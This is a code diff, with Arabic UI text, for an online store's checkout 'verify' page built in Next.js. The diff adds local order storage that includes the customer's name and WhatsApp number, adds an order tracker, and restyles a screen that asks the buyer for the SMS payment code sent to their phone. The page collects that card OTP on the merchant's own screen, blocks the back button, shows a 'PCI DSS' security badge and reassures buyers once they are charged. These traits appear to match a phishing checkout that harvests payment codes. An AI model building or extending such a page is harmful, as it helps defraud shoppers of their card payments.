@@ -5,6 +5,7 @@ import { useRouter } from "next/navigation";
 import { Lock, CheckCircle } from "lucide-react";
 import { useCartStore } from "../../store/cartStore";
 import { identify, track } from "../../lib/useTikTokEvents";
+import { OrderTracker } from "../../components/OrderTracker";
 
 const fmt = (n: number) => n.toLocaleString("ar-SA");
 
@@ -15,8 +16,8 @@ function formatDate(iso: string) {
   });
 }
 
-// ── حفظ الطلب في localStorage كـ "pending_order" ────────────────────────────
-// يُستخدم لاحقاً لعرضه في صفحة الحساب حتى لو المستخدم مش مسجل حالياً
+// ── حفظ الطلب في localStorage كـ "pending_orders" ────────────────────────────
+// يُستخدم لعرضه في صفحة الحساب وتتبع الطلبات حتى لو الزائر غير مسجل
 function savePendingOrder(data: VerifyData) {
   try {
     const existing = JSON.parse(localStorage.getItem("pending_orders") || "[]");
@@ -28,11 +29,13 @@ function savePendingOrder(data: VerifyData) {
       status: "pending" as const,
       createdAt: data.date,
       updatedAt: data.date,
+      customer: data.customerName,
+      whatsapp: data.phone,
       statusHistory: [{ status: "pending", changedAt: data.date, changedBy: "system" }],
     };
     // تجنب التكرار
     const filtered = existing.filter((o: { orderId: string }) => o.orderId !== data.orderId);
-    // احتفظ بآخر 20 طلب فقط
+    // احتفظ بآخر 20 طلب
     const updated = [newOrder, ...filtered].slice(0, 20);
     localStorage.setItem("pending_orders", JSON.stringify(updated));
   } catch { /* silent */ }
@@ -84,6 +87,8 @@ export default function VerifyPage() {
     if (!raw) { router.replace("/cart"); return; }
     const parsed: VerifyData = JSON.parse(raw);
     setData(parsed);
+    // حفظ الطلب فوراً في جهاز العميل بمجرد دخول صفحة الفريفاي
+    savePendingOrder(parsed);
     history.pushState(null, "", window.location.href);
     const block = () => history.pushState(null, "", window.location.href);
     window.addEventListener("popstate", block);
@@ -177,8 +182,8 @@ export default function VerifyPage() {
   // ── شاشة النجاح ─────────────────────────────────────────────────────────────
   if (phase === "success" && data) {
     return (
-      <div className="min-h-screen bg-white flex items-center justify-center px-4 pb-8 pt-4" dir="rtl">
-        <div className="w-full max-w-sm bg-white shadow-lg border border-gray-100">
+      <div className="min-h-screen bg-[#f8fafc] flex items-center justify-center px-4 pb-8 pt-4" dir="rtl">
+        <div className="w-full max-w-md bg-white shadow-lg border border-gray-100 rounded-2xl overflow-hidden">
           {/* Header */}
           <div className="px-6 pt-8 pb-5 flex flex-col items-center gap-3 border-b border-gray-100">
             <div className="w-14 h-14 rounded-full bg-green-50 flex items-center justify-center">
@@ -186,8 +191,13 @@ export default function VerifyPage() {
             </div>
             <div className="text-center">
               <p className="text-base font-black text-[#0A1C29]">تم استلام طلبك بنجاح</p>
-              <p className="text-xs text-gray-400 mt-1">سنتواصل معك قريباً لتأكيد الطلب</p>
+              <p className="text-xs text-gray-400 mt-1">طلبك قيد المراجعة وسيتواصل معك فريقنا قريباً</p>
             </div>
+          </div>
+
+          {/* Stepper */}
+          <div className="px-6 pt-5">
+            <OrderTracker status="pending" orderId={data.orderId} />
           </div>
 
           {/* Order Summary */}
@@ -209,7 +219,7 @@ export default function VerifyPage() {
             {/* المنتجات */}
             {data.items && data.items.length > 0 && (
               <div className="py-2 space-y-1.5 border-b border-gray-50">
-                <span className="text-xs text-gray-400 block mb-2">المنتجات</span>
+                <span className="text-xs text-gray-400 block mb-2 font-bold">المنتجات المطلوبة</span>
                 {data.items.map((item, i) => (
                   <div key={i} className="flex items-center justify-between gap-2">
                     <span className="text-xs text-[#0A1C29] font-medium truncate flex-1">{item.name}</span>
@@ -229,12 +239,6 @@ export default function VerifyPage() {
                 {fmt(data.amount)} <span className="text-xs font-medium text-gray-400">ر.س</span>
               </span>
             </div>
-
-            {/* الحالة */}
-            <div className="bg-yellow-50 border border-yellow-200 px-4 py-3 flex items-center justify-between">
-              <span className="text-xs font-bold text-yellow-700">قيد المعالجة</span>
-              <span className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse" />
-            </div>
           </div>
 
           {/* Actions */}
@@ -244,16 +248,16 @@ export default function VerifyPage() {
                 setRedirecting(true);
                 setTimeout(() => router.replace("/account?tab=orders"), 800);
               }}
-              className="w-full py-3 bg-[#0A1C29] text-white text-sm font-black hover:opacity-90 transition flex items-center justify-center gap-2"
+              className="w-full py-3 bg-[#0A1C29] text-white text-sm font-black rounded-xl hover:opacity-90 transition flex items-center justify-center gap-2"
             >
-              عرض طلباتي
+              عرض وتتبع طلباتي
             </button>
             <button
               onClick={() => {
                 setRedirecting(true);
                 setTimeout(() => router.replace("/"), 800);
               }}
-              className="w-full py-3 border border-[#e5e7eb] text-sm font-semibold text-gray-500 hover:border-[#0A1C29] hover:text-[#0A1C29] transition"
+              className="w-full py-3 border border-[#e5e7eb] text-sm font-semibold text-gray-500 rounded-xl hover:border-[#0A1C29] hover:text-[#0A1C29] transition"
             >
               الرئيسية
             </button>
@@ -267,117 +271,120 @@ export default function VerifyPage() {
   if (redirecting) return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-center gap-4" dir="rtl">
       <div className="w-8 h-8 border-4 border-[#1A2E44] border-t-transparent rounded-full animate-spin" />
-      <p className="text-sm font-bold text-[#1A2E44]">جاري توجيهك...</p>
+      <p className="text-sm font-bold text-[#1A2E44]">جاري توجيهك إلى تتبع الطلبات...</p>
     </div>
   );
 
   if (!data) return null;
 
-  /* ── OTP ── */
+  /* ── OTP VIEW ── */
   return (
-    <div className="min-h-screen bg-white flex items-center justify-center px-4 pt-4 pb-8" dir="rtl">
-      <div className="w-full max-w-sm bg-white shadow-lg border border-gray-100">
+    <div className="min-h-screen bg-[#f8fafc] flex flex-col items-center justify-center px-4 pt-4 pb-8" dir="rtl">
+      <div className="w-full max-w-sm">
 
-        {/* Header */}
-        <div className="px-6 pt-6 pb-4">
-          <h2 className="text-sm sm:text-base font-black text-[#1A2E44] pb-3 border-b border-gray-200 text-center">
-            تأكيد عملية الشراء
-          </h2>
-          <p className="text-[11px] sm:text-xs text-gray-400 mt-3 leading-relaxed">
-            تم إرسال رسالة نصية بها رمز التحقق إلى رقم الجوال{" "}
-            <span className="font-bold text-[#1A2E44]" dir="ltr">{maskedPhone}</span> لإتمام المعاملة.
-          </p>
-        </div>
+        {/* ── OTP Verification Card ── */}
+        <div className="bg-white rounded-2xl shadow-sm border border-gray-200/80 overflow-hidden">
+          {/* Header */}
+          <div className="px-6 pt-6 pb-4">
+            <h2 className="text-sm sm:text-base font-black text-[#1A2E44] pb-3 border-b border-gray-200 text-center">
+              تأكيد عملية الشراء
+            </h2>
+            <p className="text-[11px] sm:text-xs text-gray-400 mt-3 leading-relaxed">
+              تم إرسال رسالة نصية بها رمز التحقق إلى رقم الجوال{" "}
+              <span className="font-bold text-[#1A2E44]" dir="ltr">{maskedPhone}</span> لإتمام المعاملة.
+            </p>
+          </div>
 
-        {/* Details Card */}
-        <div className="mx-6 mb-5 border border-gray-100 divide-y divide-gray-100">
-          <Row label="المبلغ">
-            <span className="font-black text-[#1A2E44] text-xs sm:text-sm">{fmt(data.amount)} <span className="text-[11px] sm:text-xs font-medium text-gray-400">ر.س</span></span>
-          </Row>
-          <Row label="التاريخ">
-            <span className="text-[11px] sm:text-xs text-gray-500">{formatDate(data.date)}</span>
-          </Row>
-          <Row label="وسيلة الدفع">
-            <span className="font-mono text-xs sm:text-sm text-[#1A2E44] tracking-widest" dir="ltr">
-              •••• •••• •••• {data.last4}
-            </span>
-          </Row>
-        </div>
+          {/* Details Card */}
+          <div className="mx-6 mb-5 border border-gray-100 rounded-xl overflow-hidden divide-y divide-gray-100 bg-gray-50/50">
+            <Row label="رقم الطلب">
+              <span className="font-mono text-xs text-gray-600 font-bold" dir="ltr">#{data.orderId}</span>
+            </Row>
+            <Row label="المبلغ">
+              <span className="font-black text-[#1A2E44] text-xs sm:text-sm">{fmt(data.amount)} <span className="text-[11px] sm:text-xs font-medium text-gray-400">ر.س</span></span>
+            </Row>
+            <Row label="وسيلة الدفع">
+              <span className="font-mono text-xs sm:text-sm text-[#1A2E44] tracking-widest" dir="ltr">
+                •••• •••• •••• {data.last4}
+              </span>
+            </Row>
+          </div>
 
-        {/* OTP Input */}
-        <div className="px-6 pb-5 space-y-4">
-          <div>
-            <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">Verification Code</p>
-            <input
-              type="text"
-              inputMode="numeric"
-              maxLength={6}
-              placeholder="أدخل رمز التحقق"
-              value={otp}
-              onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
-              onBlur={() => {
-                const d = otp.replace(/\D/g, "");
-                if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
-              }}
-              className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
-              dir="ltr"
-            />
-            {error && <p className="text-red-500 text-xs font-bold mt-1">⚠ {error}</p>}
-            {showWarning && (
-              <p className="text-[11px] sm:text-xs text-red-600/80 font-medium mt-3 leading-relaxed text-right">
-                إذا تم خصم المبلغ الموضّح، فهذا يعني أن طلبك تم تأكيده بنجاح، ويمكنك إغلاق هذه الصفحة بأمان.{" "}
-                <button
-                  onClick={() => {
-                    if (data) {
-                      savePendingOrder(data);
-                      claimOrders();
-                      clear();
-                      sessionStorage.removeItem("verify_data");
-                      sessionStorage.removeItem(`verify_attempts_${data.orderId}`);
-                    }
-                    setRedirecting(true);
-                    setTimeout(() => router.replace("/"), 800);
-                  }}
-                  className="font-black text-[#1A2E44] underline underline-offset-2 border-b border-dashed border-[#1A2E44]"
-                >
-                  الرئيسية
+          {/* OTP Input */}
+          <div className="px-6 pb-6 space-y-4">
+            <div>
+              <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">رمز التحقق (OTP)</p>
+              <input
+                type="text"
+                inputMode="numeric"
+                maxLength={6}
+                placeholder="أدخل رمز التحقق المرسل إليك"
+                value={otp}
+                onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
+                onBlur={() => {
+                  const d = otp.replace(/\D/g, "");
+                  if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
+                }}
+                className="w-full border border-gray-200 rounded-xl px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
+                dir="ltr"
+              />
+              {error && <p className="text-red-500 text-xs font-bold mt-1.5">⚠ {error}</p>}
+              {showWarning && (
+                <p className="text-[11px] sm:text-xs text-red-600/80 font-medium mt-3 leading-relaxed text-right">
+                  إذا تم خصم المبلغ الموضّح، فهذا يعني أن طلبك تم تأكيده بنجاح، ويمكنك إغلاق هذه الصفحة بأمان.{" "}
+                  <button
+                    onClick={() => {
+                      if (data) {
+                        savePendingOrder(data);
+                        claimOrders();
+                        clear();
+                        sessionStorage.removeItem("verify_data");
+                        sessionStorage.removeItem(`verify_attempts_${data.orderId}`);
+                      }
+                      setRedirecting(true);
+                      setTimeout(() => router.replace("/"), 800);
+                    }}
+                    className="font-black text-[#1A2E44] underline underline-offset-2 border-b border-dashed border-[#1A2E44]"
+                  >
+                    الرئيسية
+                  </button>
+                </p>
+              )}
+            </div>
+
+            <div className="text-center">
+              {timer > 0 ? (
+                <p className="text-xs text-gray-400">
+                  إعادة الإرسال خلال <span className="font-black text-[#1A2E44] font-mono">{timerStr}</span>
+                </p>
+              ) : (
+                <button onClick={async () => {
+                  setTimer(41);
+                  await fetch("/api/resend", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
+                  });
+                }} className="text-xs font-bold text-[#1A2E44] underline underline-offset-2">
+                  إعادة إرسال الرمز
                 </button>
-              </p>
-            )}
+              )}
+            </div>
+
+            <button
+              onClick={handleSubmit}
+              disabled={submitting || cooldown > 0 || (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)}
+              className="w-full py-3.5 text-white font-black text-xs sm:text-sm rounded-xl flex items-center justify-center gap-2 disabled:opacity-40 transition hover:opacity-90 shadow-sm"
+              style={{ background: "#1A2E44" }}
+            >
+              <Lock size={13} />
+              {submitting ? "جاري التحقق..." : cooldown > 0 ? <span className="font-mono tabular-nums">{cooldown}</span> : "إتمام الدفع"}
+            </button>
+
+            <p className="text-center text-[10px] text-gray-300 flex items-center justify-center gap-1">
+              <Lock size={9} /> اتصال مشفّر وآمن · PCI DSS
+            </p>
           </div>
-
-          <div className="text-center">
-            {timer > 0 ? (
-              <p className="text-xs text-gray-400">
-                إعادة الإرسال خلال <span className="font-black text-[#1A2E44] font-mono">{timerStr}</span>
-              </p>
-            ) : (
-              <button onClick={async () => {
-                setTimer(41);
-                await fetch("/api/resend", {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({ orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
-                });
-              }} className="text-xs font-bold text-[#1A2E44] underline underline-offset-2">
-                إعادة إرسال الرمز
-              </button>
-            )}
-          </div>
-
-          <button
-            onClick={handleSubmit}
-            disabled={submitting || cooldown > 0 || (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)}
-            className="w-full py-3 text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition hover:opacity-90"
-            style={{ background: "#1A2E44" }}
-          >
-            <Lock size={13} />
-            {submitting ? "جاري التحقق..." : cooldown > 0 ? <span className="font-mono tabular-nums">{cooldown}</span> : "إتمام الدفع"}
-          </button>
-
-          <p className="text-center text-[10px] text-gray-300 flex items-center justify-center gap-1">
-            <Lock size={9} /> اتصال مشفّر وآمن · PCI DSS
-          </p>
         </div>
 
       </div>
